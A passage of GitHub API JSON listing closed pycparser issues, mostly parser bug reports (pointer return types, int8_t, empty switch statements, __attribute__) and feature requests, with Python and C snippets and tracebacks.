"https://api.github.com/users/yevka/subscriptions", "organizations_url": "https://api.github.com/users/yevka/orgs", "repos_url": "https://api.github.com/users/yevka/repos", "events_url": "https://api.github.com/users/yevka/events{/privacy}", "received_events_url": "https://api.github.com/users/yevka/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-01-14T10:22:10Z", "updated_at": "2020-01-14T11:47:49Z", "closed_at": "2020-01-14T11:47:00Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\n\r\nI have a function\r\n\r\n```c\r\nvoid* memmgr_alloc(int nbytes);\r\n```\r\n\r\nI expect to see void* but I see void.\r\n```python\r\nfrom __future__ import print_function\r\nfrom pycparser import c_ast, parse_file, c_generator\r\nimport sys\r\n\r\n# This is not required if you've installed pycparser into\r\n# your site-packages/ with setup.py\r\nsys.path.extend(['.', '..'])\r\n\r\n\r\nclass FuncDeclVisitor(c_ast.NodeVisitor):\r\n    nodes = []\r\n\r\n    def visit_FuncDecl(self, node):\r\n        self.nodes.append(node)\r\n\r\n\r\ndef main():\r\n    c_header = sys.argv[1]\r\n    ast = parse_file(c_header, use_cpp=True, cpp_args=r'-Iutils/fake_libc_include')\r\n    visitor = FuncDeclVisitor()\r\n    visitor.visit(ast)\r\n    generator = c_generator.CGenerator()\r\n    if len(visitor.nodes) > 0:\r\n        for node in visitor.nodes:\r\n            print(node)\r\n            print(generator.visit(node.type.type))  # I expect to see 'void*' but I see 'void'\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n\r\n```\r\n\r\n\r\n\r\npycparser generated ast:\r\n```python\r\nFuncDecl(args=ParamList(params=[Decl(name='nbytes',\r\n                                     quals=[\r\n                                           ],\r\n                                     storage=[\r\n                                             ],\r\n                                     funcspec=[\r\n                                              ],\r\n                                     type=TypeDecl(declname='nbytes',\r\n                                                   quals=[\r\n                                                         ],\r\n                                                   type=IdentifierType(names=['int'\r\n                                                                             ]\r\n                                                                       )\r\n                                                   ),\r\n                                     init=None,\r\n                                     bitsize=None\r\n                                     )\r\n                               ]\r\n                        ),\r\n         type=PtrDecl(quals=[\r\n                            ],\r\n                      type=TypeDecl(declname='memmgr_alloc',\r\n                                    quals=[\r\n                                          ],\r\n                                    type=IdentifierType(names=['void'\r\n                                                              ]\r\n                                                        )\r\n                                    )\r\n                      )\r\n         )\r\n\r\nProcess finished with exit code 0\r\n\r\n```\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/359", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/359/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/359/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/359/events", "html_url": "https://github.com/eliben/pycparser/issues/359", "id": 541275374, "node_id": "MDU6SXNzdWU1NDEyNzUzNzQ=", "number": 359, "title": "Publish sdist and bdist wheel", "user": {"login": "groodt", "id": 343415, "node_id": "MDQ6VXNlcjM0MzQxNQ==", "avatar_url": "https://avatars1.githubusercontent.com/u/343415?v=4", "gravatar_id": "", "url": "https://api.github.com/users/groodt", "html_url": "https://github.com/groodt", "followers_url": "https://api.github.com/users/groodt/followers", "following_url": "https://api.github.com/users/groodt/following{/other_user}", "gists_url": "https://api.github.com/users/groodt/gists{/gist_id}", "starred_url": "https://api.github.com/users/groodt/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/groodt/subscriptions", "organizations_url": "https://api.github.com/users/groodt/orgs", "repos_url": "https://api.github.com/users/groodt/repos", "events_url": "https://api.github.com/users/groodt/events{/privacy}", "received_events_url": "https://api.github.com/users/groodt/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 14, "created_at": "2019-12-21T03:21:06Z", "updated_at": "2020-03-04T14:22:21Z", "closed_at": "2020-03-04T14:22:21Z", "author_association": "NONE", "active_lock_reason": null, "body": "The benefits of wheels are well documented. See: https://pythonwheels.com/\r\nThis package is pure Python and publishing it as both source and as a wheel is simple.\r\n\r\nWould you accept a contribution to add a Makefile to this repo that would allow you to build both source distribution (sdist) and built distribution (wheel)?\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/356", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/356/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/356/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/356/events", "html_url": "https://github.com/eliben/pycparser/issues/356", "id": 530868212, "node_id": "MDU6SXNzdWU1MzA4NjgyMTI=", "number": 356, "title": "add helper for replacing a node, i.e. replace(parent_node, old_node, new_node)", "user": {"login": "robertmuth", "id": 23122675, "node_id": "MDQ6VXNlcjIzMTIyNjc1", "avatar_url": "https://avatars1.githubusercontent.com/u/23122675?v=4", "gravatar_id": "", "url": "https://api.github.com/users/robertmuth", "html_url": "https://github.com/robertmuth", "followers_url": "https://api.github.com/users/robertmuth/followers", "following_url": "https://api.github.com/users/robertmuth/following{/other_user}", "gists_url": "https://api.github.com/users/robertmuth/gists{/gist_id}", "starred_url": "https://api.github.com/users/robertmuth/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/robertmuth/subscriptions", "organizations_url": "https://api.github.com/users/robertmuth/orgs", "repos_url": "https://api.github.com/users/robertmuth/repos", "events_url": "https://api.github.com/users/robertmuth/events{/privacy}", "received_events_url": "https://api.github.com/users/robertmuth/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-12-02T03:37:13Z", "updated_at": "2020-03-03T14:37:50Z", "closed_at": "2020-03-03T14:37:49Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am not sure if pycparser is meant mostly for read-only access to the AST or if modifications are \r\n\"in scope\". In the latter case a helper  for updating nodes would be useful.\r\nConcretely, something like this:\r\n\r\nhttps://github.com/robertmuth/Cwerg/blob/034b6c9f135f39847b8957455e256d22175a6ad3/common.py#L171\r\n\r\nHopefully, there is some introspection magic that would make this less verbose and error prone.\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/355", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/355/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/355/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/355/events", "html_url": "https://github.com/eliben/pycparser/issues/355", "id": 517066561, "node_id": "MDU6SXNzdWU1MTcwNjY1NjE=", "number": 355, "title": "Avoid __file__", "user": {"login": "jayvdb", "id": 15092, "node_id": "MDQ6VXNlcjE1MDky", "avatar_url": "https://avatars1.githubusercontent.com/u/15092?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jayvdb", "html_url": "https://github.com/jayvdb", "followers_url": "https://api.github.com/users/jayvdb/followers", "following_url": "https://api.github.com/users/jayvdb/following{/other_user}", "gists_url": "https://api.github.com/users/jayvdb/gists{/gist_id}", "starred_url": "https://api.github.com/users/jayvdb/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jayvdb/subscriptions", "organizations_url": "https://api.github.com/users/jayvdb/orgs", "repos_url": "https://api.github.com/users/jayvdb/repos", "events_url": "https://api.github.com/users/jayvdb/events{/privacy}", "received_events_url": "https://api.github.com/users/jayvdb/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-11-04T10:36:19Z", "updated_at": "2019-11-04T13:27:27Z", "closed_at": "2019-11-04T13:27:26Z", "author_association": "NONE", "active_lock_reason": null, "body": "`pycparser` and thus `cffi` are failing in PyOxidizer because `pycparser.ply.lex` is expecting `pycparser.c_lexer` and `pycparser.c_parser` to have a `__file__`\r\n\r\n```py\r\ncffi.api:112: in cdef\r\n    ???\r\ncffi.api:126: in _cdef\r\n    ???\r\ncffi.cparser:358: in parse\r\n    ???\r\ncffi.cparser:363: in _internal_parse\r\n    ???\r\ncffi.cparser:305: in _parse\r\n    ???\r\ncffi.cparser:52: in _get_parser\r\n    ???\r\npycparser.c_parser:88: in __init__\r\n    ???\r\npycparser.c_lexer:66: in build\r\n    ???\r\npycparser.ply.lex:894: in lex\r\n    ???\r\nE   AttributeError: module 'pycparser.c_lexer' has no attribute '__file__'\r\n```\r\n\r\nI can populate those `__file__` with `'junk'` and it seems that my build gets a _lot_ further, so possible those values are not needed.  Or there could be a fallback, such as using `importlib.resources`.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/353", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/353/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/353/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/353/events", "html_url": "https://github.com/eliben/pycparser/issues/353", "id": 512217815, "node_id": "MDU6SXNzdWU1MTIyMTc4MTU=", "number": 353, "title": "Simple typo in pycparser/ply/yacc.py - Diagonistic", "user": {"login": "timgates42", "id": 47873678, "node_id": "MDQ6VXNlcjQ3ODczNjc4", "avatar_url": "https://avatars1.githubusercontent.com/u/47873678?v=4", "gravatar_id": "", "url": "https://api.github.com/users/timgates42", "html_url": "https://github.com/timgates42", "followers_url": "https://api.github.com/users/timgates42/followers", "following_url": "https://api.github.com/users/timgates42/following{/other_user}", "gists_url": "https://api.github.com/users/timgates42/gists{/gist_id}", "starred_url": "https://api.github.com/users/timgates42/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/timgates42/subscriptions", "organizations_url": "https://api.github.com/users/timgates42/orgs", "repos_url": "https://api.github.com/users/timgates42/repos", "events_url": "https://api.github.com/users/timgates42/events{/privacy}", "received_events_url": "https://api.github.com/users/timgates42/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-10-24T22:49:41Z", "updated_at": "2019-11-08T02:36:37Z", "closed_at": "2019-10-27T13:11:37Z", "author_association": "NONE", "active_lock_reason": null, "body": "Should be Diagnostic instead.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/352", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/352/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/352/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/352/events", "html_url": "https://github.com/eliben/pycparser/issues/352", "id": 498871359, "node_id": "MDU6SXNzdWU0OTg4NzEzNTk=", "number": 352, "title": "int8_t not supported", "user": {"login": "zingale", "id": 7817509, "node_id": "MDQ6VXNlcjc4MTc1MDk=", "avatar_url": "https://avatars0.githubusercontent.com/u/7817509?v=4", "gravatar_id": "", "url": "https://api.github.com/users/zingale", "html_url": "https://github.com/zingale", "followers_url": "https://api.github.com/users/zingale/followers", "following_url": "https://api.github.com/users/zingale/following{/other_user}", "gists_url": "https://api.github.com/users/zingale/gists{/gist_id}", "starred_url": "https://api.github.com/users/zingale/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/zingale/subscriptions", "organizations_url": "https://api.github.com/users/zingale/orgs", "repos_url": "https://api.github.com/users/zingale/repos", "events_url": "https://api.github.com/users/zingale/events{/privacy}", "received_events_url": "https://api.github.com/users/zingale/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-09-26T13:03:39Z", "updated_at": "2019-09-26T13:05:47Z", "closed_at": "2019-09-26T13:05:46Z", "author_association": "NONE", "active_lock_reason": null, "body": "The C type `int8_t` does not appear to be recognized:\r\n```\r\n  File \"/home/zingale/.local/lib/python2.7/site-packages/pycparser/c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"/home/zingale/.local/lib/python2.7/site-packages/pycparser/ply/yacc.py\", line 331, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"/home/zingale/.local/lib/python2.7/site-packages/pycparser/ply/yacc.py\", line 1199, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"/home/zingale/.local/lib/python2.7/site-packages/pycparser/ply/yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"/home/zingale/.local/lib/python2.7/site-packages/pycparser/c_parser.py\", line 1848, in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n  File \"/home/zingale/.local/lib/python2.7/site-packages/pycparser/plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\npycparser.plyparser.ParseError: tmp_build_dir/t/3d.gnu.MPI.EXE/Castro_error_F-cppd.h:3:6: before: int8_t```\r\n\r\nis it possible to add this to the list of data types?\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/351", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/351/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/351/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/351/events", "html_url": "https://github.com/eliben/pycparser/issues/351", "id": 497536413, "node_id": "MDU6SXNzdWU0OTc1MzY0MTM=", "number": 351, "title": "Issue when running example codes", "user": {"login": "Aiswarya-kk", "id": 53484324, "node_id": "MDQ6VXNlcjUzNDg0MzI0", "avatar_url": "https://avatars3.githubusercontent.com/u/53484324?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Aiswarya-kk", "html_url": "https://github.com/Aiswarya-kk", "followers_url": "https://api.github.com/users/Aiswarya-kk/followers", "following_url": "https://api.github.com/users/Aiswarya-kk/following{/other_user}", "gists_url": "https://api.github.com/users/Aiswarya-kk/gists{/gist_id}", "starred_url": "https://api.github.com/users/Aiswarya-kk/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Aiswarya-kk/subscriptions", "organizations_url": "https://api.github.com/users/Aiswarya-kk/orgs", "repos_url": "https://api.github.com/users/Aiswarya-kk/repos", "events_url": "https://api.github.com/users/Aiswarya-kk/events{/privacy}", "received_events_url": "https://api.github.com/users/Aiswarya-kk/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-09-24T08:26:49Z", "updated_at": "2020-03-03T14:38:07Z", "closed_at": "2020-03-03T14:38:07Z", "author_association": "NONE", "active_lock_reason": null, "body": "Error when trying this command :\r\n**python examples/c-to-c.py /home/aishu/Desktop/coll_rew_ast.txt**\r\n![ast-c-error](https://user-images.githubusercontent.com/53484324/65525506-3b103e80-df0d-11e9-9bc7-3022625f8459.png)\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/348", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/348/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/348/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/348/events", "html_url": "https://github.com/eliben/pycparser/issues/348", "id": 488376223, "node_id": "MDU6SXNzdWU0ODgzNzYyMjM=", "number": 348, "title": "Parsing C to obtain syscall locations", "user": {"login": "stevenagy", "id": 11542566, "node_id": "MDQ6VXNlcjExNTQyNTY2", "avatar_url": "https://avatars0.githubusercontent.com/u/11542566?v=4", "gravatar_id": "", "url": "https://api.github.com/users/stevenagy", "html_url": "https://github.com/stevenagy", "followers_url": "https://api.github.com/users/stevenagy/followers", "following_url": "https://api.github.com/users/stevenagy/following{/other_user}", "gists_url": "https://api.github.com/users/stevenagy/gists{/gist_id}", "starred_url": "https://api.github.com/users/stevenagy/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/stevenagy/subscriptions", "organizations_url": "https://api.github.com/users/stevenagy/orgs", "repos_url": "https://api.github.com/users/stevenagy/repos", "events_url": "https://api.github.com/users/stevenagy/events{/privacy}", "received_events_url": "https://api.github.com/users/stevenagy/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2019-09-03T03:36:40Z", "updated_at": "2019-09-03T18:06:50Z", "closed_at": "2019-09-03T18:06:50Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello all,\r\n\r\n(apologies if I'm overlooking something!)\r\n\r\nI'm wondering if pycparser supports locating syscalls like it does function calls? \r\n\r\nThank you!\r\n-Stefan\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/345", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/345/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/345/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/345/events", "html_url": "https://github.com/eliben/pycparser/issues/345", "id": 482061896, "node_id": "MDU6SXNzdWU0ODIwNjE4OTY=", "number": 345, "title": "\"'NoneType' object is not iterable\" seen for switch statement without cases", "user": {"login": "TysonAndre", "id": 1904430, "node_id": "MDQ6VXNlcjE5MDQ0MzA=", "avatar_url": "https://avatars2.githubusercontent.com/u/1904430?v=4", "gravatar_id": "", "url": "https://api.github.com/users/TysonAndre", "html_url": "https://github.com/TysonAndre", "followers_url": "https://api.github.com/users/TysonAndre/followers", "following_url": "https://api.github.com/users/TysonAndre/following{/other_user}", "gists_url": "https://api.github.com/users/TysonAndre/gists{/gist_id}", "starred_url": "https://api.github.com/users/TysonAndre/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/TysonAndre/subscriptions", "organizations_url": "https://api.github.com/users/TysonAndre/orgs", "repos_url": "https://api.github.com/users/TysonAndre/repos", "events_url": "https://api.github.com/users/TysonAndre/events{/privacy}", "received_events_url": "https://api.github.com/users/TysonAndre/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-08-19T01:04:36Z", "updated_at": "2019-08-21T17:15:23Z", "closed_at": "2019-08-21T17:15:23Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Seen calling parse_file on a file containing the below snippet (similar code was generated by a preprocessor). This compiles with `gcc`. I think checking if block_items is None may be sufficient.\r\n\r\n```c\r\nint main() {\r\n    int type = 2;\r\n    switch(type) {}\r\n}\r\n```\r\n\r\n```\r\n/usr/local/lib/python3.7/site-packages/pycparser/ply/yacc.py in parseopt_notrack(self, input, lexer, debug, tracking, tokenfunc)\r\n   1116                             del symstack[-plen:]\r\n   1117                             self.state = state\r\n-> 1118                             p.callable(pslice)\r\n   1119                             del statestack[-plen:]\r\n   1120                             symstack.append(sym)\r\n\r\n/usr/local/lib/python3.7/site-packages/pycparser/c_parser.py in p_selection_statement_3(self, p)\r\n   1505         \"\"\" selection_statement : SWITCH LPAREN expression RPAREN pragmacomp_or_statement \"\"\"\r\n   1506         p[0] = fix_switch_cases(\r\n-> 1507                 c_ast.Switch(p[3], p[5], self._token_coord(p, 1)))\r\n   1508 \r\n   1509     def p_iteration_statement_1(self, p):\r\n\r\n/usr/local/lib/python3.7/site-packages/pycparser/ast_transforms.py in fix_switch_cases(switch_node)\r\n     75     # Goes over the children of the Compound below the Switch, adding them\r\n     76     # either directly below new_compound or below the last Case as appropriate\r\n---> 77     for child in switch_node.stmt.block_items:\r\n     78         if isinstance(child, (c_ast.Case, c_ast.Default)):\r\n     79             # If it's a Case/Default:\r\n\r\nTypeError: 'NoneType' object is not iterable\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/342", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/342/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/342/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/342/events", "html_url": "https://github.com/eliben/pycparser/issues/342", "id": 476765011, "node_id": "MDU6SXNzdWU0NzY3NjUwMTE=", "number": 342, "title": "variable scope", "user": {"login": "djn3m0", "id": 4627943, "node_id": "MDQ6VXNlcjQ2Mjc5NDM=", "avatar_url": "https://avatars0.githubusercontent.com/u/4627943?v=4", "gravatar_id": "", "url": "https://api.github.com/users/djn3m0", "html_url": "https://github.com/djn3m0", "followers_url": "https://api.github.com/users/djn3m0/followers", "following_url": "https://api.github.com/users/djn3m0/following{/other_user}", "gists_url": "https://api.github.com/users/djn3m0/gists{/gist_id}", "starred_url": "https://api.github.com/users/djn3m0/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/djn3m0/subscriptions", "organizations_url": "https://api.github.com/users/djn3m0/orgs", "repos_url": "https://api.github.com/users/djn3m0/repos", "events_url": "https://api.github.com/users/djn3m0/events{/privacy}", "received_events_url": "https://api.github.com/users/djn3m0/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-08-05T09:52:31Z", "updated_at": "2019-08-06T12:17:29Z", "closed_at": "2019-08-06T12:17:29Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello,\r\n\r\nHow can I get if a variable is Local, Global or extern? and ideally where(which file/line) its declared?\r\n\r\nThank you.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/341", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/341/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/341/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/341/events", "html_url": "https://github.com/eliben/pycparser/issues/341", "id": 476502150, "node_id": "MDU6SXNzdWU0NzY1MDIxNTA=", "number": 341, "title": "handling #define in c code", "user": {"login": "djn3m0", "id": 4627943, "node_id": "MDQ6VXNlcjQ2Mjc5NDM=", "avatar_url": "https://avatars0.githubusercontent.com/u/4627943?v=4", "gravatar_id": "", "url": "https://api.github.com/users/djn3m0", "html_url": "https://github.com/djn3m0", "followers_url": "https://api.github.com/users/djn3m0/followers", "following_url": "https://api.github.com/users/djn3m0/following{/other_user}", "gists_url": "https://api.github.com/users/djn3m0/gists{/gist_id}", "starred_url": "https://api.github.com/users/djn3m0/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/djn3m0/subscriptions", "organizations_url": "https://api.github.com/users/djn3m0/orgs", "repos_url": "https://api.github.com/users/djn3m0/repos", "events_url": "https://api.github.com/users/djn3m0/events{/privacy}", "received_events_url": "https://api.github.com/users/djn3m0/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-08-04T00:37:18Z", "updated_at": "2019-08-04T21:30:18Z", "closed_at": "2019-08-04T21:30:18Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi, \r\n\r\nIm trying to do some traces between function calls etc.. but some macros, definitions with #define are not supported with pycparser! :(\r\n\r\nI wonder what would you suggest to cover those?\r\n\r\nThank you", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/338", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/338/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/338/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/338/events", "html_url": "https://github.com/eliben/pycparser/issues/338", "id": 472765409, "node_id": "MDU6SXNzdWU0NzI3NjU0MDk=", "number": 338, "title": "pycparser to plant UML:  Insted of general AST I want to use plant UML in sepcific are there any sugusstions or any extension for interpeters can be a great help ", "user": {"login": "BollimpalliSuryateja", "id": 30198723, "node_id": "MDQ6VXNlcjMwMTk4NzIz", "avatar_url": "https://avatars1.githubusercontent.com/u/30198723?v=4", "gravatar_id": "", "url": "https://api.github.com/users/BollimpalliSuryateja", "html_url": "https://github.com/BollimpalliSuryateja", "followers_url": "https://api.github.com/users/BollimpalliSuryateja/followers", "following_url": "https://api.github.com/users/BollimpalliSuryateja/following{/other_user}", "gists_url": "https://api.github.com/users/BollimpalliSuryateja/gists{/gist_id}", "starred_url": "https://api.github.com/users/BollimpalliSuryateja/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/BollimpalliSuryateja/subscriptions", "organizations_url": "https://api.github.com/users/BollimpalliSuryateja/orgs", "repos_url": "https://api.github.com/users/BollimpalliSuryateja/repos", "events_url": "https://api.github.com/users/BollimpalliSuryateja/events{/privacy}", "received_events_url": "https://api.github.com/users/BollimpalliSuryateja/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-07-25T09:38:44Z", "updated_at": "2019-07-25T21:23:51Z", "closed_at": "2019-07-25T21:23:51Z", "author_association": "NONE", "active_lock_reason": null, "body": "", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/336", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/336/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/336/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/336/events", "html_url": "https://github.com/eliben/pycparser/issues/336", "id": 470033909, "node_id": "MDU6SXNzdWU0NzAwMzM5MDk=", "number": 336, "title": "C parser doesn't work with function attribute to place function in special sections", "user": {"login": "thekenu", "id": 16970019, "node_id": "MDQ6VXNlcjE2OTcwMDE5", "avatar_url": "https://avatars3.githubusercontent.com/u/16970019?v=4", "gravatar_id": "", "url": "https://api.github.com/users/thekenu", "html_url": "https://github.com/thekenu", "followers_url": "https://api.github.com/users/thekenu/followers", "following_url": "https://api.github.com/users/thekenu/following{/other_user}", "gists_url": "https://api.github.com/users/thekenu/gists{/gist_id}", "starred_url": "https://api.github.com/users/thekenu/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/thekenu/subscriptions", "organizations_url": "https://api.github.com/users/thekenu/orgs", "repos_url": "https://api.github.com/users/thekenu/repos", "events_url": "https://api.github.com/users/thekenu/events{/privacy}", "received_events_url": "https://api.github.com/users/thekenu/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-07-18T23:06:01Z", "updated_at": "2019-07-19T02:50:35Z", "closed_at": "2019-07-19T02:50:34Z", "author_association": "NONE", "active_lock_reason": null, "body": "If I add to `__attribute__ ((section (\"bar\")))` to my function prototype and then run `c-to-c.py`, the program breaks and is unable to print out anything.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/335", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/335/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/335/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/335/events", "html_url": "https://github.com/eliben/pycparser/issues/335", "id": 467465828, "node_id": "MDU6SXNzdWU0Njc0NjU4Mjg=", "number": 335, "title": "Problem with function pointer", "user": {"login": "BollimpalliSuryateja", "id": 30198723, "node_id": "MDQ6VXNlcjMwMTk4NzIz", "avatar_url": "https://avatars1.githubusercontent.com/u/30198723?v=4", "gravatar_id": "", "url": "https://api.github.com/users/BollimpalliSuryateja", "html_url": "https://github.com/BollimpalliSuryateja", "followers_url": "https://api.github.com/users/BollimpalliSuryateja/followers", "following_url": "https://api.github.com/users/BollimpalliSuryateja/following{/other_user}", "gists_url": "https://api.github.com/users/BollimpalliSuryateja/gists{/gist_id}", "starred_url": "https://api.github.com/users/BollimpalliSuryateja/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/BollimpalliSuryateja/subscriptions", "organizations_url": "https://api.github.com/users/BollimpalliSuryateja/orgs", "repos_url": "https://api.github.com/users/BollimpalliSuryateja/repos", "events_url": "https://api.github.com/users/BollimpalliSuryateja/events{/privacy}", "received_events_url": "https://api.github.com/users/BollimpalliSuryateja/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 202072333, "node_id": "MDU6TGFiZWwyMDIwNzIzMzM=", "url": "https://api.github.com/repos/eliben/pycparser/labels/pending-user-input", "name": "pending-user-input", "color": "fef2c0", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-07-12T15:10:39Z", "updated_at": "2019-07-16T07:18:07Z", "closed_at": "2019-07-16T07:18:07Z", "author_association": "NONE", "active_lock_reason": null, "body": "static sm_trans transition_table[NUM_STATES][NUM_EVENTS] = {\r\n\r\n        [NA] =\r\n        {\r\n                [CFG_DONE] =\r\n                {\r\n                        .cng = DOWN,\r\n                        .action = drop_down\r\n                }\r\n        },\r\n\r\n        [L2UP] =\r\n        {\r\n                [READY] =\r\n                {\r\n                        .action = subscribe\r\n                },\r\n                [RESERVED] =\r\n                {\r\n                        .action = remove_endpoints\r\n                },\r\n                [DOWN] =\r\n                {\r\n                        .cng = DOWN\r\n                